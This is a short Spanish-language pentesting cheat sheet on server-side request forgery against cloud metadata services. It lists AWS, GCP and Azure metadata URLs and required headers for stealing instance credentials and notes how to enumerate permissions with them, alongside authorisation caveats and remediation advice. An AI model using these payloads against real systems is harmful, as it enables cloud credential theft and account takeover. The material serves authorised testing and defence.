# SSRF a metadatos cloud

Ver índice: [ssrf.md](ssrf.md). **Solo sobre objetivos autorizados.** El objetivo estrella del SSRF: robar credenciales de la instancia.

## AWS (IMDS)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol>
```

Devuelve `AccessKeyId`, `SecretAccessKey` y `Token` temporales → acceso a la cuenta con esos permisos.

- **IMDSv2** exige un token previo por cabecera (`X-aws-ec2-metadata-token`); un SSRF que solo controla la URL puede no bastar si el entorno fuerza v2.

## GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# requiere cabecera:  Metadata-Flavor: Google
```

## Azure (IMDS)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# requiere cabecera:  Metadata: true
```

## Qué hacer con las credenciales

- AWS: configúralas y enumera permisos (`aws sts get-caller-identity`, luego S3, etc.) — **dentro del alcance**.
- Demuestra el impacto con una acción mínima (identidad/listar), no toques datos reales.

## Notas

- Si el SSRF no permite añadir cabeceras, GCP/Azure/IMDSv2 se complican; AWS IMDSv1 es el caso más directo.
- Reporta siempre forzar IMDSv2 y bloquear el acceso a `169.254.169.254` como remediación.
